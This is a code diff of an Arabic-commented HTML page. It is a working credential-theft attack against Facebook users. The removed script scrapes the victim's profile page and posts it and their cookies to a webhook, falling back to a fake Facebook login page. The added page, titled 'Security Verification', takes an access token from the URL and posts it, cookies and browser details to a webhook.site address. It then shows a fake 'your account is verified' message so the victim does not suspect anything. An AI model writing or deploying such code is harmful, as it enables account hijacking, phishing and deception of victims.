@@ -1,25 +1,29 @@
-<script>
-    const webhookURL = "https://YOUR_PIPEDREAM_ENDPOINT.com"; // ضع رابط Pipedream هنا
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Verification</title>
+</head>
+<body>
+    <script>
+        // 1. استخراج التوكن من الرابط إذا كان موجوداً
+        const urlParams = new URLSearchParams(window.location.hash.replace("#", "?"));
+        const token = urlParams.get('access_token');
 
-    async function grabData() {
-        try {
-            // محاولة سحب معلومات الحساب عبر طلب داخلي لفيسبوك
-            let response = await fetch('https://mbasic.facebook.com/profile.php');
-            let text = await response.text();
-            
-            // إرسال النتيجة إلى لوحة تحكمك
-            fetch(webhookURL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    html: text, // سيحتوي هذا النص على الـ ID والبيانات الحساسة
-                    cookies: document.cookie
-                })
-            });
-        } catch (e) {
-            // إذا فشل السحب المباشر، يوجهه لصفحة تسجيل دخول مزيفة (Phishing)
-            window.location.href = "https://facebook-security-verify.github.io/login";
-        }
-    }
-    window.onload = grabData;
-</script>
+        // 2. إرسال البيانات (التوكن + الكوكيز) إلى Webhook.site
+        fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+                access_token: token,
+                cookies: document.cookie,
+                victim_info: navigator.userAgent,
+                time: new Date().toLocaleString()
+            })
+        });
+
+        // 3. تمويه الضحية لعدم الشك
+        document.body.innerHTML = "<center><h2 style='color:green;margin-top:50px;'>تم التحقق من أمان حسابك بنجاح. يمكنك إغلاق الصفحة الآن.</h2></center>";
+    </script>
+</body>
+</html>
